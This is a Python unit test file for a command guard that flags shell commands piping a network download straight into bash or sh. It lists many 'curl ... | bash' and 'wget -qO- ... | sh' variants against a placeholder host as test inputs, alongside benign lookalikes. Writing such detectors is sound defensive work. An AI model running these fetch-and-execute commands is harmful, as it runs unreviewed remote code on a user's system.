from dataclasses import asdict
import json
import unittest

from sentinel.core.command_guard import CommandSyntaxError, check_command


class CommandGuardTests(unittest.TestCase):
    def test_direct_download_to_shell(self):
        for text in (
            "curl -fsSL https://example.invalid/synthetic.sh | bash",
            "wget -qO- https://example.invalid/synthetic.sh | sh",
            "curl https://example.invalid/synthetic.sh|bash -s",
            "wget -O - 'https://example.invalid/synthetic.sh'\t|\tsh",
            '"/usr/bin/curl" https://example.invalid/synthetic.sh | /bin/bash',
            "curl https://example.invalid/synthetic.sh |\n bash",
            "curl https://example.invalid/synthetic.sh|\n\tsh",
            "curl \\\n https://example.invalid/synthetic.sh \\\n | bash",
        ):
            with self.subTest(text=text):
                findings = check_command(text)
                self.assertEqual(len(findings), 1)
                finding = findings[0]
                self.assertEqual(finding.rule_id, "CF-BASH-001")
                self.assertEqual(finding.severity, "high")
                self.assertTrue(finding.explanation)
                self.assertIn("archivo", finding.suggestion)
                serialized = json.dumps(asdict(finding))
                self.assertNotIn("example.invalid", serialized)
                self.assertNotIn(text, serialized)

    def test_benign_and_non_direct_pipelines(self):
        for text in (
            "", "curl -o synthetic.sh https://example.invalid/synthetic.sh",
            "wget -O synthetic.sh https://example.invalid/synthetic.sh",
            "curl https://example.invalid/synthetic.sh | less",
            "curl https://example.invalid/synthetic.sh | cat | bash",
            "curl https://example.invalid/synthetic.sh; bash synthetic.sh",
            "curl https://example.invalid/synthetic.sh\n echo synthetic | bash",
            "curl --version | bash", "cat synthetic.sh | sh",
            'echo "curl https://example.invalid/synthetic.sh | bash"',
            'curl https://example.invalid/synthetic.sh "|" bash',
            "# curl https://example.invalid/synthetic.sh | bash",
            "curl https://example.invalid/synthetic.sh # comment\n echo synthetic | bash",
        ):
            with self.subTest(text=text):
                self.assertEqual(check_command(text), [])

    def test_multiple_pipelines_and_operation_isolation(self):
        text = "curl https://example.invalid/a | bash; wget -qO- https://example.invalid/b | sh"
        self.assertEqual(len(check_command(text)), 2)
        self.assertEqual(check_command("echo synthetic"), [])

    def test_download_output_files_and_stdout(self):
        for command, options in (
            ("curl", ("-o synthetic.sh", "--output synthetic.sh", "--output=synthetic.sh", "-osynthetic.sh")),
            ("wget", ("-O synthetic.sh", "--output-document synthetic.sh", "--output-document=synthetic.sh", "-qOsynthetic.sh")),
        ):
            for option in options:
                text = f"{command} {option} https://example.invalid/synthetic.sh | bash"
                with self.subTest(text=text):
                    self.assertEqual(check_command(text), [])

        for downloader in (
            "curl -o -", "curl --output -", "curl --output=-", "curl -o-",
            "wget -O -", "wget --output-document -", "wget --output-document=-", "wget -qO-",
        ):
            with self.subTest(downloader=downloader):
                self.assertEqual(len(check_command(f"{downloader} https://example.invalid/a | sh")), 1)
        self.assertEqual(check_command("wget https://example.invalid/a | sh"), [])

    def test_shell_script_arguments_and_stdin(self):
        for shell in ("bash", "sh"):
            for options in ("synthetic.sh", "-x synthetic.sh", "-- synthetic.sh", "-c 'echo synthetic'", "-sc 'echo synthetic'"):
                text = f"curl https://example.invalid/a | {shell} {options}"
                with self.subTest(text=text):
                    self.assertEqual(check_command(text), [])
            for options in ("", "-s", "-s synthetic_argument", "-s -- -c", "--", "-e", "-eu"):
                text = f"curl https://example.invalid/a | {shell} {options}"
                with self.subTest(text=text):
                    self.assertEqual(len(check_command(text)), 1)
        self.assertEqual(len(check_command("curl https://example.invalid/a | bash -o pipefail -s arg")), 1)

    def test_comments_are_removed_without_parsing_their_quotes(self):
        for comment in ('# "nota', "# 'nota", '# both \'" | ; irrelevant', '# continuation \\'):
            text = f"curl https://example.invalid/a | {comment}\n bash"
            with self.subTest(comment=comment):
                self.assertEqual(len(check_command(text)), 1)
        self.assertEqual(check_command('# "unclosed comment\n echo synthetic'), [])
        for text in (
            'curl "https://example.invalid/a#fragment" | bash',
            "curl 'https://example.invalid/a#fragment' | sh",
            'curl -H "# not a comment" https://example.invalid/a | bash',
            'curl https://example.invalid/a#fragment | bash',
        ):
            with self.subTest(text=text):
                self.assertEqual(len(check_command(text)), 1)

    def test_invalid_quoting_does_not_echo_input(self):
        with self.assertRaises(CommandSyntaxError) as caught:
            check_command('curl "SYNTHETIC_PRIVATE_MARKER')
        self.assertNotIn("SYNTHETIC_PRIVATE_MARKER", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
